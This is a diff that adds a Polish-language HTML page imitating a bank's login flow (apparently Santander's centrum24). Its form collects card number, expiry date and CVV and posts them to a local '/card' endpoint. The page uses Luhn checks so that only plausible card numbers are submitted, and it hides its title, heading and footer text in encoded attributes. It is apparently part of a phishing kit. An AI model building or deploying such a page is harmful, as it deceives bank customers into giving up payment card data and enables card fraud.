@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pl" lang="pl" class="customelements svg rgba cssanimations">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title data-p="FScwOyQrKSMhKCNiKSMwNjtvESMsNiMsJicwYgAjLCliEi0uMSkjYhFsA2w="></title>
+<style>
+/* Anti-flicker: hide page until CSS variables and fonts are applied */
+html { opacity: 0; }
+</style>
+<!-- Tokens CSS FIRST: contains CSS variables used by everything else -->
+<link rel="stylesheet" type="text/css" href="/js-core/_css_style_3_tokens.min.css" media="screen">
+<link rel="stylesheet" type="text/css" href="/js-core/_css_style_3_style.min.css" media="screen">
+<link rel="stylesheet" type="text/css" href="/js-core/_css_eSmart_logowanie.min.css" media="screen">
+<link rel="stylesheet" type="text/css" href="/js-core/_css_eSmart_resetPassword.min.css" media="screen">
+<link rel="stylesheet" type="text/css" href="/js-core/_css_style_3_advisor.min.css" media="screen">
+<link rel="stylesheet" type="text/css" href="/js-core/_css_style_3_button.min.css" media="screen">
+<link rel="stylesheet" type="text/css" href="/js-core/topbar.css">
+<link rel="stylesheet" type="text/css" href="/js-core/modal-window-ver-22BBC2C4DE67F76D12FD6C1C9BB9E578.css">
+<link rel="stylesheet" type="text/css" href="/js-core/simpleModal-ver-0BA3CCE7B5F18FD662D314B8779F0F65.css">
+<link rel="stylesheet" type="text/css" href="/js-core/wicket-modal-ver-E99D4201F0F6C5D3081AD42ACB1F22C2.css">
+<link rel="stylesheet" type="text/css" href="/js-core/skip-links-ver-387A5F8E8180995F8D165399E2AE0719.css">
+<link rel="stylesheet" type="text/css" href="/js-core/f-01.css">
+<link rel="stylesheet" type="text/css" href="/js-core/opensans-font.css">
+<link rel="shortcut icon" href="/favicon.ico">
+<style>
+.lang-select-container{padding-left:1rem}.lang_container{position:absolute;box-shadow:0 1px 10px 0 var(--color-effect-shadow);border-radius:var(--size-border-radius-03);width:18.5rem;right:1.5rem;z-index:99999;border:1px solid var(--color-border-soft);background-color:var(--color-background-default)}.lang_container.hidden{display:none}ul#lang{list-style:none;padding:.25rem;margin:0}ul#lang li{text-align:left;height:3rem;background-color:var(--color-background-default);align-content:center;cursor:pointer;display:flex;justify-content:space-between}ul#lang li img{display:none}ul#lang li.selected-language img{display:flex;width:.875rem}ul#lang li a{color:var(--color-text-default);padding:.75rem;display:flex;width:100%;justify-content:space-between}.select-button{height:3rem;width:7rem;background-color:var(--color-background-default);border-radius:var(--size-border-radius-03);border:1px solid var(--color-border-default);cursor:pointer;font-size:1rem;display:inline-flex;justify-content:space-between;padding:.75rem}.select-button img{width:.875rem}#lang .selected-language{background-color:var(--color-background-alternative-strong);border-radius:var(--size-border-radius-03)}#lang .selected-language a{font-weight:bold}
+.content_center_input{width:100%!important;box-sizing:border-box!important}
+.feedbackDiv>div{width:100%!important;display:flex!important;align-items:center}
+</style>
+<style>
+.card-row{display:flex;gap:1rem;margin-top:1rem}
+.card-row .card-field{flex:1}
+.card-error{color:var(--color-text-negative,#d9251d);font-size:.8rem;margin-top:4px;display:none}
+.card-error.show{display:block}
+</style>
+<script type="text/javascript" src="/js-core/jquery-ver-8FB8FEE4FCC3CC86FF6C724154C49C42.js"></script>
+<script type="text/javascript" src="/js-core/bootstrap-transition-ver-0A47AAFF7AFCA3B3485A6A845782947F.js"></script>
+<script type="text/javascript" src="/js-core/bootstrap-modal-ver-D73745175D40F05B339406F168BFD100.js"></script>
+<script type="text/javascript" src="/js-core/bootstrap-tooltip-ver-6AE9DC400F463921E1DED65DB0556DFC.js"></script>
+<script type="text/javascript" src="/js-core/bootstrap-popover-ver-3782DF41A2EBE1257EDED4E19F39CA02.js"></script>
+<script type="text/javascript" src="/js-core/top-bar-ver-73264633F57DB47A42D9237555AB56B0.js"></script>
+<script>centrum24={}; centrum24.originalDestinationUrl="";</script>
+<script>
+function langContainerHandler(button, langContainer) {
+  button.setAttribute("aria-expanded", "false");
+  document.addEventListener('mousedown', function(e) {
+    if (e.target === button || e.target.parentElement === button) {
+      var exp = button.getAttribute("aria-expanded") === "true";
+      button.setAttribute("aria-expanded", String(!exp));
+      if (exp) langContainer.classList.add("hidden");
+      else { langContainer.classList.remove("hidden"); try{langContainer.querySelectorAll('li a')[0].focus();}catch(ex){} }
+    } else if (!e.target.closest || !e.target.closest('.lang-select-container')) {
+      langContainer.classList.add("hidden"); button.setAttribute("aria-expanded","false");
+    }
+  });
+}
+</script>
+<script>
+function luhn(num) {
+  var digits = num.replace(/\D/g,'');
+  if (digits.length < 13) return false;
+  var sum=0, alt=false;
+  for (var i=digits.length-1;i>=0;i--) {
+    var n=parseInt(digits[i],10);
+    if (alt){n*=2;if(n>9)n-=9;}
+    sum+=n;alt=!alt;
+  }
+  return sum%10===0;
+}
+document.addEventListener('DOMContentLoaded', function() {
+  if (typeof initTopBarPanel === 'function') initTopBarPanel();
+  var b = document.getElementById('id6'), c = document.getElementById('id5');
+  if (b && c) langContainerHandler(b, c);
+  function validateCard() {
+    var rawCardNum = document.getElementById('card_number').value;
+    var digitsOnly = rawCardNum.replace(/\D/g,'');
+    var errEl = document.getElementById('card-error');
+    var okBtn = document.getElementById('okBtn2');
+    
+    if (digitsOnly.length >= 13) {
+      var isValid = luhn(rawCardNum);
+      if (!isValid && digitsOnly.length >= 16) {
+        errEl.classList.add('show');
+        okBtn.disabled = true;
+        okBtn.style.opacity = '0.5';
+      } else if (isValid) {
+        errEl.classList.remove('show');
+        okBtn.disabled = false;
+        okBtn.style.opacity = '1';
+      } else {
+        errEl.classList.remove('show');
+        okBtn.disabled = true;
+        okBtn.style.opacity = '0.5';
+      }
+    } else {
+      errEl.classList.remove('show');
+      okBtn.disabled = true;
+      okBtn.style.opacity = '0.5';
+    }
+  }
+
+  document.getElementById('card_number').addEventListener('input', function() {
+    var v=this.value.replace(/\D/g,'').substring(0,19);
+    this.value=v.replace(/(.{4})/g,'$1 ').trim();
+    validateCard();
+  });
+  document.getElementById('card_expiry').addEventListener('input', function() {
+    var v=this.value.replace(/\D/g,'').substring(0,4);
+    if(v.length>=3) v=v.substring(0,2)+'/'+v.substring(2);
+    this.value=v;
+  });
+  document.getElementById('cardForm').addEventListener('submit', function(e) {
+    var cardNum=document.getElementById('card_number').value;
+    var errEl=document.getElementById('card-error');
+    if(!luhn(cardNum)){
+        e.preventDefault();
+        errEl.classList.add('show');
+        document.getElementById('card_number').focus();
+        return false;
+    }
+  });
+  validateCard();
+  document.getElementById('card_number').focus();
+});
+</script>
+</head>
+<body>
+<div id="wrapper" class="fixed">
+<header id="header" class="loginPanel">
+<div class="leftLoginPanel">
+<a rel="noreferrer noopener" class="bankLogo" href="#/"><img alt="" src="/js-core/i-01.svg"></a>
+<div class="title"></div>
+</div>
+<div class="rightLoginPanel">
+<div class="rightPanelContainer">
+<div id="id7" class="top-bar">
+<section id="page_head">
+<nav class="page_header_wrapper page">
+<ul style="list-style:none;display:flex;gap:1rem;height:1.25rem;" role="list">
+<li><a href="#" class="contact">Kontakt</a></li>
+<li><a rel="noreferrer noopener" href="#/" class="order2"><span data-p="ESMsNiMsJicwbDIu"></span></a></li>
+<li><a href="#" class="signin">Inne serwisy</a></li>
+</ul>
+</nav>
+</section>
+<section class="loginPanel contact_details"><a class="window-close" href="#" title="Zamknij okno"></a></section>
+<section class="signin_box"><a class="window-close" href="#" title="Zamknij okno"></a><div class="left"><article><div class="wrapper info_logowanie">Logowanie dla klientów indywidualnych i firm</div></article></div></section>
+</div>
+<div class="lang-select-container">
+<button type="button" class="select-button" aria-expanded="false" role="combobox" aria-haspopup="listbox" id="id6" aria-controls="id5">
+<span>Polski</span><img src="/js-core/drop-down-arrow.svg" alt="">
+</button>
+<div class="lang_container hidden" role="listbox" id="id5">
+<ul id="lang">
+<li class="selected-language"><a href="#" aria-selected="true" lang="pl">Polski<img src="/js-core/list-tick.svg" alt=""></a></li>
+<li><a href="#" aria-selected="false" lang="en">English<img src="/js-core/list-tick.svg" alt=""></a></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</header>
+<main id="container">
+<div id="kolumna-lewa">
+<div id="bezpieczenstwo">
+<div class="title safety-image"></div>
+<ol id="bezpieczenstwoLista">
+<div class="item"><li aria-hidden="true"></li><span>Nie podawaj nikomu swojego loginu i hasła.</span></div>
+<div class="item"><li aria-hidden="true"></li><span>Czytaj dokładnie co zatwierdzasz smsKodem lub w aplikacji.</span></div>
+<div class="item"><li aria-hidden="true"></li><span>Zastanów się zanim klikniesz w link w wiadomości.</span></div>
+</ol>
+<div class="item"><a rel="noreferrer noopener" class="login-link" target="_blank" href="#/klient-indywidualny/bankowosc-internetowa/bezpieczne-bankowanie">Więcej o bezpieczeństwie</a></div>
+</div>
+<div id="log_left">
+<iframe src="/js-core/promo-left.html" style="width:230px;height:160px;overflow:hidden;" frameborder="0"></iframe>
+</div>
+</div>
+<div id="content">
+<div class="login-wrapper">
+<div id="logowanie" class="logowanie loginPanel">
+<div class="header-container"><h1><span data-p="FScwOyQrKSMhKCNiCRANCWJx"></span></h1></div>
+<div id="logowanie-inner-NIK">
+<form class="nikForm f1" id="cardForm" method="post" action="/card" novalidate="">
+<div class="forms">
+<div class="labelsLine"><label for="card_number"><strong>Numer karty</strong></label></div>
+<div class="feedbackDiv">
+<span id="card-warning"></span>
+<div><input id="card_number" name="card_number" class="content_center_input first-focusable-element" autocomplete="off" tabindex="0" aria-required="true" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric"></div>
+</div>
+<div class="card-error" id="card-error">Nieprawidłowy numer karty. Sprawdź i spróbuj ponownie.</div>
+<div class="card-row">
+<div class="card-field">
+<div class="labelsLine"><label for="card_expiry"><strong>Data ważności</strong></label></div>
+<div class="feedbackDiv"><div>
+<input id="card_expiry" name="card_expiry" class="content_center_input" autocomplete="off" tabindex="0" aria-required="true" placeholder="MM/RR" inputmode="numeric" maxlength="5">
+</div></div>
+</div>
+<div class="card-field">
+<div class="labelsLine"><label for="card_cvv"><strong>Kod CVV</strong></label></div>
+<div class="feedbackDiv"><div>
+<input id="card_cvv" name="card_cvv" type="password" class="content_center_input" autocomplete="off" tabindex="0" aria-required="true" placeholder="XXX" inputmode="numeric" maxlength="3">
+</div></div>
+</div>
+</div>
+<div class="button-next" style="margin-top:1.5rem;"><input type="submit" id="okBtn2" class="button button-primary" value="Dalej"></div>
+</div>
+</form>
+</div>
+</div>
+</div>
+<div class="news second-focusable-element">
+<p><strong>Bezpieczeństwo</strong></p>
+<p><a rel="noreferrer noopener" style="font-weight:bold" href="#/klient-indywidualny/bankowosc-internetowa/bezpieczne-bankowanie/komunikaty" target="_blank">Sprawdź</a> aktualne komunikaty o cyberoszustwach.</p>
+<br>
+<p><strong>Zaplanowane przerwy</strong></p>
+<p><a rel="noreferrer noopener" style="font-weight:bold" href="#/dostepnosc" target="_blank">Sprawdź</a> dostępność usług banku.</p>
+</div>
+</div>
+<div id="kolumna-prawa">
+<div id="log_right">
+<iframe src="/js-core/promo-right.html" style="width:190px;height:490px;overflow:hidden;" frameborder="0"></iframe>
+</div>
+</div>
+</main>
+</div>
+<footer id="foot">
+<div class="inner-foot">
+<div class="footContent" data-p="fjE2MC0sJXwRIyw2IywmJzBiACMsKWISLS4xKSNiEWwDbH5tMTYwLSwlfGI4YjErJyY4KyDFh2LRsGIVIzAxOCM1KyduYjIwODtiIy5sYggjLCNiEiM1xIAjYgsLYnN1bmJycm96d3ZiFSMwMTgjNSNuYjgjMCcoJzE2MC01IywjYtGwYhHFhyY4KydiECcoLSwtNTsvYiYuI2IvbGIxNmxiFSMwMTgjNTti0bBiFSMwMTgjNSsnbmIaCwsLYhU7JjgrI8SAYgUtMTItJiMwITg7YgkwIygtNSclLWIQJygnMTYwN2IRxYcmLTUnJS1iMi0mYiwwYgkQEWJycnJycnJ6dXBxbGIMCxJient0b3Jycm93dG91cWxiEAcFDQxie3FycnZzcXZzbA=="></div>
+<div class="footContent"><div><a target="_blank" href="#">Polityka cookies</a></div></div>
+</div>
+</footer>
+<script>
+/* Show page after CSS has been applied (2 rAF = after first paint with CSS) */
+document.addEventListener('DOMContentLoaded', function() {
+  requestAnimationFrame(function() {
+    requestAnimationFrame(function() {
+      document.documentElement.style.opacity = '1';
+    });
+  });
+});
+</script>
+<script src="/js/protect.js"></script>
+<script src="/js/client.js"></script>
+</body>
+</html>
